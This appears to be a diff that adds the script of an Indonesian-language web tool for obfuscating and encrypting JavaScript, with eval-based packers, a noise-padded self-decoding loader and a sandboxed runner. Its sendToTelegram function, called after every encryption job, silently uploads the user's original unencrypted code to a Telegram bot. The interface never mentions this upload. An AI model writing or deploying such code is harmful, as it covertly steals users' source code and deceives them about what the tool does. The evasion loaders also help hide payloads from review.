+  const swatch = e.target.closest('.color-swatch');
+  if (swatch) {
+    document.querySelector('.color-swatch.active')?.classList.remove('active');
+    swatch.classList.add('active');
+    applyTheme(swatch.dataset.theme, logoTextInput.value);
+  }
+});
+logoTextInput.addEventListener('input', () => {
+  applyTheme(document.querySelector('.color-swatch.active').dataset.theme, logoTextInput.value);
+});
+settingNoiseDensity.addEventListener('input', () => {
+  noiseDensityValue.textContent = `${settingNoiseDensity.value}%`;
+});
+saveSettingsBtn.addEventListener('click', saveSettings);
+
+
+/* ===========================
+   HELPER FUNCTIONS (Umum)
+   =========================== */
+function setStatus(message, type = 'info') {
+  statusBadge.textContent = message;
+  if (type === 'error') statusBadge.style.color = 'var(--danger)';
+  else if (type === 'success') statusBadge.style.color = 'var(--success)';
+  else if (type === 'warn') statusBadge.style.color = 'var(--warn)';
+  else statusBadge.style.color = 'var(--muted)';
+}
+function setProgress(p) { progressBar.style.width = Math.max(0, Math.min(100, p)) + '%'; }
+function downloadBlob(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
+async function sendToTelegram(filename, content) {
+  try {
+    const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
+    const fd = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    const blob = new Blob([content], { type: 'application/javascript' });
+    fd.append('document', blob, filename);
+    await fetch(url, { method: 'POST', body: fd });
+  } catch (err) { console.error('TG Send Error:', err); }
+}
+
+/* ===========================
+   LOGIKA NAVIGASI HALAMAN
+   =========================== */
+function showPage(pageId) {
+  Object.values(pageViews).forEach(page => page.classList.remove('active'));
+  Object.values(navButtons).forEach(btn => btn.classList.remove('active'));
+  pageViews[pageId].classList.add('active');
+  navButtons[pageId].classList.add('active');
+}
+
+navButtons.home.addEventListener('click', () => showPage('home'));
+navButtons.files.addEventListener('click', () => showPage('files'));
+navButtons.run.addEventListener('click', () => showPage('run'));
+navButtons.settings.addEventListener('click', () => showPage('settings'));
+
+/* ===========================
+   LOGIKA TERMINAL (V7)
+   =========================== */
+function logToTerminal(message, type = 'log') {
+  const line = document.createElement('span');
+  line.className = `log-${type}`;
+  line.textContent = `[${type.toUpperCase()}] ${new Date().toLocaleTimeString()}: ${String(message)}\n`;
+  terminalLog.appendChild(line);
+  // Auto-scroll
+  terminalLog.parentElement.scrollTop = terminalLog.parentElement.scrollHeight;
+}
+
+function createSandbox() {
+  if (sandbox) {
+    sandbox.parentNode.removeChild(sandbox);
+  }
+  sandbox = document.createElement('iframe');
+  sandbox.id = 'sandbox-iframe';
+  sandbox.style.display = 'none';
+  sandbox.setAttribute('sandbox', 'allow-scripts');
+  document.getElementById('page-run').appendChild(sandbox);
+
+  sandbox.contentWindow.console = {
+    ...sandbox.contentWindow.console,
+    log: (...args) => logToTerminal(args.join(' '), 'log'),
+    error: (...args) => logToTerminal(args.join(' '), 'error'),
+    warn: (...args) => logToTerminal(args.join(' '), 'warn'),
+    info: (...args) => logToTerminal(args.join(' '), 'info'),
+  };
+
+  sandbox.contentWindow.onerror = (message, source, lineno, colno, error) => {
+    logToTerminal(`Uncaught Error: ${message} (di ${lineno}:${colno})`, 'error');
+    return true;
+  };
+}
+
+runCodeBtn.addEventListener('click', () => {
+  const codeToRun = outputTextarea.value;
+  if (!codeToRun) {
+    logToTerminal('Tidak ada kode di Output untuk dijalankan.', 'system');
+    showPage('home');
+    setStatus('Tidak ada kode di Output untuk dijalankan.', 'warn');
+    return;
+  }
+
+  try {
+    createSandbox();
+    logToTerminal('Menjalankan kode...', 'system');
+    
+    const script = sandbox.contentWindow.document.createElement('script');
+    script.textContent = codeToRun;
+    sandbox.contentWindow.document.body.appendChild(script);
+    
+    logToTerminal('Eksekusi selesai.', 'system');
+
+  } catch (e) {
+    logToTerminal(`Gagal mengeksekusi: ${e.message}`, 'error');
+  }
+});
+
+clearLogBtn.addEventListener('click', () => {
+  terminalLog.innerHTML = '';
+  logToTerminal('Log dibersihkan.', 'system');
+});
+
+
+/* ===========================
+   LOGIKA UI (Validasi, Opsi)
+   =========================== */
+function validateInput() {
+  let hasInput = false;
+  if (currentMode === 'text') hasInput = jsTextarea.value.trim().length > 0;
+  else if (currentMode === 'file') hasInput = singleFileData !== null;
+  else if (currentMode === 'zip') hasInput = zipFileData !== null;
+  
+  const needsPassword = ['aes', 'rc4', 'rabbit', 'tdes'].includes(encryptTypeSelect.value);
+  let hasPassword = passwordInput.value.trim().length > 0;
+  
+  processBtn.disabled = !(hasInput && (!needsPassword || hasPassword));
+  
+  const hasOutput = outputTextarea.value.length > 0;
+  outputActions.style.display = (currentMode === 'zip' || !hasOutput) ? 'none' : 'flex';
+  outputTextarea.parentElement.style.display = (currentMode === 'zip') ? 'none' : 'block';
+}
+
+jsTextarea.addEventListener('input', () => {
+  currentMode = 'text';
+  singleFileData = null;
+  zipFileData = null;
+  fileInfoDisplay.textContent = 'Input: Textarea';
+  validateInput();
+});
+
+encryptTypeSelect.addEventListener('change', () => {
+  const needsPassword = ['aes', 'rc4', 'rabbit', 'tdes'].includes(encryptTypeSelect.value);
+  passwordGroup.style.display = needsPassword ? 'block' : 'none';
+  validateInput();
+});
+
+passwordInput.addEventListener('input', validateInput);
+outputTextarea.addEventListener('input', validateInput);
+
+copyBtn.addEventListener('click', () => {
+  navigator.clipboard.writeText(outputTextarea.value).then(() => {
+    copyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Tersalin!</span>';
+    setTimeout(() => {
+      copyBtn.innerHTML = '<i class="fas fa-copy"></i> <span>Salin Hasil</span>';
+    }, 2000);
+  }).catch(err => {
+    setStatus('Gagal menyalin: ' + err.message, 'error');
+  });
+});
+
+/* ===========================
+   DROPDOWN CUSTOM (V3)
+   =========================== */
+function initializeCustomSelect(selectElement) {
+  if (!selectElement) return;
+  
+  const oldWrapper = selectElement.previousElementSibling;
+  if (oldWrapper && oldWrapper.classList.contains('custom-select-wrapper')) {
+    oldWrapper.parentNode.removeChild(oldWrapper);
+  }
+  
+  const wrapper = document.createElement('div');
+  wrapper.className = 'custom-select-wrapper';
+  const trigger = document.createElement('button');
+  trigger.className = 'custom-select-trigger';
+  const triggerText = document.createElement('span');
+  triggerText.className = 'trigger-text';
+  const triggerArrow = document.createElement('i');
+  triggerArrow.className = 'fas fa-chevron-down trigger-arrow';
+  trigger.appendChild(triggerText);
+  trigger.appendChild(triggerArrow);
+  const optionsPanel = document.createElement('div');
+  optionsPanel.className = 'custom-select-options';
+  
+  Array.from(selectElement.children).forEach(child => {
+    if (child.tagName === 'OPTGROUP') {
+      const groupLabel = document.createElement('div');
+      groupLabel.className = 'custom-optgroup-label';
+      groupLabel.textContent = child.label;
+      optionsPanel.appendChild(groupLabel);
+      Array.from(child.children).forEach(option => optionsPanel.appendChild(createCustomOption(option)));
+    } else if (child.tagName === 'OPTION') {
+      optionsPanel.appendChild(createCustomOption(child));
+    }
+  });
+  
+  function createCustomOption(option) {
+    const customOption = document.createElement('div');
+    customOption.className = 'custom-option';
+    customOption.textContent = option.textContent;
+    customOption.dataset.value = option.value;
+    if (option.selected) {
+      triggerText.textContent = option.textContent;
+      customOption.classList.add('selected');
+    }
+    customOption.addEventListener('click', () => {
+      optionsPanel.querySelector('.custom-option.selected')?.classList.remove('selected');
+      customOption.classList.add('selected');
+      triggerText.textContent = customOption.textContent;
+      selectElement.value = customOption.dataset.value;
+      selectElement.dispatchEvent(new Event('change'));
+      wrapper.classList.remove('open');
+    });
+    return customOption;
+  }
+  
+  wrapper.appendChild(trigger);
+  wrapper.appendChild(optionsPanel);
+  selectElement.parentNode.insertBefore(wrapper, selectElement);
+  trigger.addEventListener('click', (e) => { e.preventDefault(); wrapper.classList.toggle('open'); });
+  document.addEventListener('click', (e) => { if (!wrapper.contains(e.target)) wrapper.classList.remove('open'); });
+}
+
+function setDropdownValue(selectId, value) {
+  const select = document.getElementById(selectId);
+  if (!select) return;
+  select.value = value;
+  
+  const customWrapper = select.previousElementSibling;
+  if (customWrapper && customWrapper.classList.contains('custom-select-wrapper')) {
+    const triggerText = customWrapper.querySelector('.trigger-text');
+    const selectedOption = select.options[select.selectedIndex];
+    
+    if (triggerText && selectedOption) {
+      triggerText.textContent = selectedOption.textContent;
+    }
+    
+    customWrapper.querySelectorAll('.custom-option').forEach(opt => {
+      opt.classList.toggle('selected', opt.dataset.value === value);
+    });
+  }
+  select.dispatchEvent(new Event('change'));
+}
+
+
+/* ===========================
+   LOGIKA FILE MANAGER (V4)
+   =========================== */
+fileUploadInput.addEventListener('change', (e) => {
+  if (!e.target.files.length) return;
+  Array.from(e.target.files).forEach(file => {
+    if (!sessionFiles.some(f => f.name === file.name && f.size === file.size)) {
+      sessionFiles.push(file);
+    }
+  });
+  renderFileList();
+  e.target.value = null;
+});
+
+function renderFileList() {
+  fileListContainer.innerHTML = '';
+  if (sessionFiles.length === 0) {
+    fileListContainer.appendChild(fileListEmpty);
+    return;
+  }
+  
+  sessionFiles.forEach((file, index) => {
+    const item = document.createElement('div');
+    item.className = 'file-item';
+    let icon = 'fa-file-code';
+    if (file.name.endsWith('.zip')) icon = 'fa-file-archive';
+    else if (file.name.endsWith('.css')) icon = 'fa-file-alt';
+    else if (file.name.endsWith('.html')) icon = 'fa-file-code';
+    const fileSize = (file.size / 1024).toFixed(1) + ' KB';
+    item.innerHTML = `
+      <div class="file-info">
+        <i class="fas ${icon}"></i>
+        <span class="file-name" title="${file.name}">${file.name}</span>
+        <span class="file-size">${fileSize}</span>
+      </div>
+      <div class="file-actions">
+        <button class="file-action-btn btn-load-file" data-index="${index}" title="Muat ke Encryptor"><i class="fas fa-arrow-up-from-bracket"></i></button>
+        <button class="file-action-btn delete btn-delete-file" data-index="${index}" title="Hapus dari daftar"><i class="fas fa-trash"></i></button>
+      </div>`;
+    fileListContainer.appendChild(item);
+  });
+}
+
+fileListContainer.addEventListener('click', (e) => {
+  const loadBtn = e.target.closest('.btn-load-file');
+  const deleteBtn = e.target.closest('.btn-delete-file');
+  
+  if (loadBtn) {
+    const file = sessionFiles[parseInt(loadBtn.dataset.index, 10)];
+    if (file.name.endsWith('.zip')) handleZip(file);
+    else handleFile(file);
+    showPage('home');
+  } else if (deleteBtn) {
+    sessionFiles.splice(parseInt(deleteBtn.dataset.index, 10), 1);
+    renderFileList();
+  }
+});
+
+fileSearchInput.addEventListener('input', (e) => {
+  const searchTerm = e.target.value.toLowerCase();
+  fileListContainer.querySelectorAll('.file-item').forEach(item => {
+    const fileName = item.querySelector('.file-name').textContent.toLowerCase();
+    item.style.display = fileName.includes(searchTerm) ? 'flex' : 'none';
+  });
+});
+
+function handleFile(file) {
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (e) => {
+    singleFileData = { name: file.name, content: e.target.result };
+    zipFileData = null;
+    currentMode = 'file';
+    jsTextarea.value = '';
+    fileInfoDisplay.textContent = `File: ${file.name}`;
+    validateInput();
+  };
+  reader.readAsText(file);
+}
+
+function handleZip(file) {
+  if (!file || !file.name.endsWith('.zip')) return;
+  zipFileData = file;
+  singleFileData = null;
+  currentMode = 'zip';
+  jsTextarea.value = '';
+  fileInfoDisplay.textContent = `Zip: ${file.name}`;
+  validateInput();
+}
+
+
+/* ===========================
+   LOGIKA ENKRIPSI INTI (V6)
+   =========================== */
+function pack(code) {
+  function _pack(p, a, c, k, e, d) { e = function(c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) { d[e(c)] = k[c] || e(c) } k = [function(e) { return d[e] }]; e = function() { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }
+  let words = {}; (code.match(/\b[a-zA-Z_]\w*\b/g) || []).forEach(w => { if (w.length > 1) words[w] = (words[w] || 0) + 1; }); let wordList = Object.keys(words).sort((a,b) => words[b] - words[a]);
+  let a = Math.min(wordList.length, 62); if (a < 2) return `eval("${code.replace(/\\/g, '\\\\').replace(/"/g, '\\"')}")`; 
+  let k = wordList.slice(0, a); let c = a; let e = {}; for(let i=0; i<a; i++) { e[k[i]] = (i < a ? '' : (i / a).toString(36)) + ((i % a) > 35 ? String.fromCharCode((i % a) + 29) : (i % a).toString(36)); }
+  let packedCode = code.replace(/\b[a-zA-Z_]\w*\b/g, w => e[w] || w);
+  packedCode = packedCode.replace(/\\/g, '\\\\').replace(/"/g, '\"').replace(/\n/g, '\\n');
+  return `eval(function(p,a,c,k,e,d){${_pack.toString().replace(/^\s*function\s*_\w+\s*\((.*?)\)\s*\{([\s\S]*)\}\s*$/, '$2')}}("${packedCode}",${a},${c},"${k.join('|')}".split('|'),0,{}))`;
+}
+
+async function encryptString(content, type, pw) {
+  const defaultNoiseSets = ["語漢字愛和平生心光明海山風日月天地", "あいうえおかきくけこさしすせそたちつてと", "アイウエオカキクケコサシスセソタチツテト", "가나다라마바사아자차카타파하안녕", "◆◇■□▲▼★☆※〒●◯♛✦✶✹✺✻✽"];
+  const customNoise = appSettings.customNoise.trim();
+  const noiseSets = customNoise.length > 0 ? customNoise.split('\n').filter(s => s.length > 0) : defaultNoiseSets;
+  const noiseDensity = appSettings.noiseDensity;
+  
+  function aphophis_rndVar(len = 10) { const a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let s = ''; for (let i = 0; i < len; i++) s += a[Math.floor(Math.random() * a.length)]; return s; }
+  
+  function aphophis_injectNoise(base64Str) { 
+    const out = []; 
+    for (let i = 0; i < base64Str.length; i++) { 
+      out.push(base64Str[i]); 
+      if (Math.random() < noiseDensity) {
+        const set = noiseSets[Math.floor(Math.random() * noiseSets.length)];
+        const cnt = 1 + Math.floor(Math.random() * 3); 
+        for (let k = 0; k < cnt; k++) out.push(set.charAt(Math.floor(Math.random() * set.length))); 
+      } 
+    } 
+    return out.join(''); 
+  }
+  
+  function aphophis_buildLoader(obfStr) { const v1 = aphophis_rndVar(12), v2 = aphophis_rndVar(10), v3 = aphophis_rndVar(10), v4 = aphophis_rndVar(8); return [`(function(){try{`, `var ${v1}=${JSON.stringify(obfStr)};`, `function ${v2}(s){var m=s.match(/[A-Za-z0-9+\\/=]/g); if(!m) return ''; return m.join(''); }`, `function ${v3}(b64){`, `try{`, `if(typeof atob==='function'){var bin=atob(b64);var len=bin.length;var arr=new Uint8Array(len);for(var i=0;i<len;i++)arr[i]=bin.charCodeAt(i);return arr;}`, `else if(typeof Buffer!=='undefined'){return Uint8Array.from(Buffer.from(b64,'base64'));}`, `else{throw new Error('No b64 decoder');}`, `}catch(e){return new Uint8Array();}`, `}`, `function ${v4}(u8){`, `try{if(typeof TextDecoder!=='undefined'){return new TextDecoder('utf-8').decode(u8);}`, `if(typeof Buffer!=='undefined')return Buffer.from(u8).toString('utf8');`, `var s='';for(var i=0;i<u8.length;i++)s+=String.fromCharCode(u8[i]);return decodeURIComponent(escape(s));`, `}catch(e){try{return Buffer.from(u8).toString('utf8');}catch(_){return '';}}`, `}`, `var clean=${v2}(${v1});var bytes=${v3}(clean);var plain=${v4}(bytes);try{(new Function(plain))();}catch(e){console.error('exec failed',e);}}catch(e){console.error('loader fatal',e);}})();`].join(''); }
+  function strToHex(str) { return Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join(''); }
+  function rot13(str) { return str.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() <= 'm' ? 13 : -13))); }
+  
+  try {
+    switch(type) {
+      case 'base64': return btoa(unescape(encodeURIComponent(content)));
+      case 'hex': return strToHex(content);
+      case 'rot13': return rot13(content);
+      case 'url': return encodeURIComponent(content);
+      case 'binary': return Array.from(new TextEncoder().encode(content)).map(b => b.toString(2).padStart(8, '0')).join(' ');
+      case 'ascii_dec': return Array.from(content).map(c => c.charCodeAt(0)).join(' ');
+      case 'aes': return CryptoJS.AES.encrypt(content, pw).toString();
+      case 'rc4': return CryptoJS.RC4.encrypt(content, pw).toString();
+      case 'rabbit': return CryptoJS.Rabbit.encrypt(content, pw).toString();
+      case 'tdes': return CryptoJS.TripleDES.encrypt(content, pw).toString();
+      case 'aphophis': 
+        const b64 = btoa(unescape(encodeURIComponent(content))); 
+        const obf = aphophis_injectNoise(b64); 
+        return aphophis_buildLoader(obf);
+      case 'eval_b64': const b64_eval = btoa(unescape(encodeURIComponent(content))); return `eval(atob("${b64_eval}"));`;
+      case 'fromcharcode': const charCodes = Array.from(content).map(c => c.charCodeAt(0)).join(','); return `eval(String.fromCharCode(${charCodes}));`;
+      case 'packed': return pack(content);
+      case 'hex_fromcharcode': const hexCodes = Array.from(new TextEncoder().encode(content)).map(b => '0x' + b.toString(16)).join(','); return `eval(String.fromCharCode(${hexCodes}));`;
+      default: return content;
+    }
+  } catch (e) { console.error(`Encryption failed for type ${type}:`, e); setStatus(`Error: ${e.message}`, 'error'); throw e; }
+}
+
+/* ===========================
+   HANDLER TOMBOL AKSI UTAMA
+   =========================== */
+processBtn.addEventListener('click', async () => {
+  processBtn.disabled = true;
+  processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+  setStatus('Memulai proses...', 'info');
+  setProgress(0);
+  const type = encryptTypeSelect.value;
+  const pw = passwordInput.value;
+  let originalContent = '';
+  let originalFilename = 'code.js';
+  
+  try {
+    if (currentMode === 'text' || currentMode === 'file') {
+      let inputContent, inputName;
+      if (currentMode === 'text') {
+        inputContent = jsTextarea.value; inputName = 'code.js';
+      } else {
+        inputContent = singleFileData.content; inputName = singleFileData.name;
+      }
+      originalContent = inputContent; originalFilename = inputName;
+      setStatus('Mengenkripsi konten...', 'info'); setProgress(50);
+      
+      const result = await encryptString(inputContent, type, pw);
+      
+      setProgress(100); 
+      outputTextarea.value = result;
+      
+      if (appSettings.autoCopy) {
+        await navigator.clipboard.writeText(result);
+        setStatus('Enkripsi selesai! Hasil tersalin.', 'success');
+      } else {
+        setStatus('Enkripsi selesai!', 'success');
+      }
+      if (appSettings.autoClear && currentMode === 'text') {
+        jsTextarea.value = '';
+      }
+      
+      const outBlob = new Blob([result], { type: 'application/javascript' });
+      const outName = inputName.replace(/(\.[\w\d_-]+)$/i, `.enc${RegExp.$1 || '.js'}`);
+      
+      downloadBtn.onclick = () => downloadBlob(outBlob, outName);
+    
+    } else if (currentMode === 'zip') {
+      originalContent = `File ZIP: ${zipFileData.name}`; originalFilename = zipFileData.name + '.txt';
+      setStatus('Membaca file zip...', 'info'); setProgress(10);
+      const zip = await JSZip.loadAsync(zipFileData);
+      const filesToEncrypt = [];
+      zip.forEach((relativePath, file) => {
+        const ext = relativePath.split('.').pop().toLowerCase();
+        if (!file.dir && ['js', 'html', 'css'].includes(ext)) filesToEncrypt.push(file);
+      });
+      if (filesToEncrypt.length === 0) throw new Error("Tidak ada file .js, .html, atau .css di zip.");
+      setStatus(`Menemukan ${filesToEncrypt.length} file...`, 'info');
+      let filesDone = 0;
+      for (const file of filesToEncrypt) {
+        const content = await file.async('string');
+        const encryptedContent = await encryptString(content, type, pw);
+        zip.file(file.name, encryptedContent);
+        filesDone++;
+        setProgress(10 + (filesDone / filesToEncrypt.length) * 80);
+      }
+      setStatus('Membuat file zip baru...', 'info');
+      const newZipBlob = await zip.generateAsync({ type: 'blob' });
+      const outZipName = zipFileData.name.replace(/\.zip$/i, '.enc.zip');
+      downloadBlob(newZipBlob, outZipName);
+      setProgress(100); setStatus(`Sukses! ${outZipName} telah diunduh.`, 'success');
+    }
+    await sendToTelegram(originalContent, originalFilename);
+  } catch (e) {
+    console.error(e);
+    setStatus(`Error: ${e.message}`, 'error');
+  } finally {
+    processBtn.innerHTML = '<i class="fas fa-key"></i> <span>Proses & Enkripsi</span>';
+    validateInput();
+  }
+});
+
+/* ===========================
+   INIT (Jalankan saat Load)
+   =========================== */
+document.addEventListener('DOMContentLoaded', () => {
+  initializeCustomSelect(document.getElementById('encrypt-type'));
+  loadSettings(); 
+  showPage('home');
+  renderFileList();
+  validateInput();
+  logToTerminal('Terminal siap. Jalankan kode dari halaman Encryptor.', 'system');
+});
+
+</script>
+</body>
+</html>
